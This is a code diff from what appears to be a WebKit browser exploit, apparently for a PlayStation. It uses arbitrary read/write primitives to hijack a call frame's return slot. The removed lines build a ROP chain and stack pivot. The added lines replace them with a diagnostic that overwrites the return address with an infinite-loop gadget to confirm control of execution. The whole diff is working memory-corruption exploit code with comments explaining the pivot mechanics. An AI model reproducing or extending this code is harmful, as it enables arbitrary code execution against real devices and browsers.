@@ -351,52 +351,21 @@ async function prepare(p) {
             origRet = p.read8(retSlot);
             origCB = p.read8(cbSlot);
 
-            // Build the ROP chain in a fresh buffer. On entry rsp = chainEntry.
-            const chainBuf = malloc(0x400);
-            const chainEntry = chainBuf;
-            let idx = 0;
-            const push = (v) => { p.write8(chainBuf.add32(idx * 8), v); idx++; };
-            // 1) write MAGIC to scratch:  pop rdi ; scratch ; pop rax ; MAGIC ; mov [rdi],rax
-            push(gaddr("pop rdi")); push(scratch);
-            push(gaddr("pop rax")); push(MAGIC);
-            push(gaddr("mov [rdi], rax"));
-            // 2) restore the two hijacked slots to their originals:
-            push(gaddr("pop rdi")); push(retSlot);
-            push(gaddr("pop rax")); push(origRet);
-            push(gaddr("mov [rdi], rax"));
-            push(gaddr("pop rdi")); push(cbSlot);
-            push(gaddr("pop rax")); push(origCB);
-            push(gaddr("mov [rdi], rax"));
-            // 3) set the comparator's return value (boxed int 0 = "equal"):
-            push(gaddr("pop rax")); push(new int64(0x00000000, 0xffff0000));
-            // 4) clean return: rsp := retSlot, then ret pops origRet (now restored)
-            //    -> jumps back into sort with rsp = cbSlot, exactly as a normal
-            //    comparator return would leave it.
-            push(gaddr("pop rsp")); push(retSlot);
-
-            // codeBlock (CF+0x10) tells the tier: a real heap pointer => the
-            // frame is baseline-JIT'd and its epilogue is a native ret off
-            // CF+0x08 (our pivot is valid); 0/small => LLInt (pivot assumption
-            // breaks). origRet in WebKit text vs a JIT-thunk region is a second
-            // signal. Log both BEFORE the risky overwrite (this line flushes).
-            const cbLooksHeap = (origCB.hi >>> 0) >= 0x8 && (origCB.hi >>> 0) <= 0x9ff;
-            const retInWk = origRet.hi === libSceNKWebKitBase.hi
-                && (origRet.low >>> 0) >= (libSceNKWebKitBase.low >>> 0);
-            selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
-                + "-retSlot=0x" + retSlot.toString()
-                + "-chainEntry=0x" + chainEntry.toString()
-                + "-origRet=0x" + origRet.toString()
-                + "-origCB=0x" + origCB.toString()
-                + "-cbLooksHeap(JIT?)=" + cbLooksHeap
-                + "-retInWkText=" + retInWk);
-
-            // Overwrite: retSlot = pop rsp (native ret lands here), cbSlot =
-            // chainEntry (pop rsp then reads it). On our JS `return`, the
-            // baseline `ret` pops retSlot -> pop rsp -> rsp = chainEntry -> chain.
-            p.write8(cbSlot, chainEntry);
-            p.write8(retSlot, gaddr("pop rsp"));
-            selfLog("SELF-PIVOT-FIRED", "slots-overwritten-returning-now-"
-                + "(if trail ends here the pivot/chain/return faulted)");
+            // DIAGNOSTIC: before risking a full chain, test whether
+            // overwriting CF+0x08 actually redirects control. Point it at an
+            // infinite-loop gadget (jmp $, no memory access). Outcomes:
+            //   PAGE HANGS (no crash/reboot) -> CF+0x08 IS the live return
+            //     control point; the earlier crash was in the ROP chain, not
+            //     the pivot. (You must hard-reboot after a hang.)
+            //   PAGE CRASHES -> overwriting CF+0x08 corrupts control (wrong
+            //     slot / rsp semantics).
+            //   SORT CONTINUES (SELF-PIVOT-RESULT appears) -> we located a
+            //     STALE frame; CF+0x08 was not the live return.
+            const infloop = gaddr("infloop");
+            selfLog("SELF-PIVOT-FIRED", "cf+0x08:=infloop(0x" + infloop.toString()
+                + ") -- HANG=slot-is-control, CRASH=wrong-slot, "
+                + "CONTINUE=stale-frame");
+            p.write8(retSlot, infloop);
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
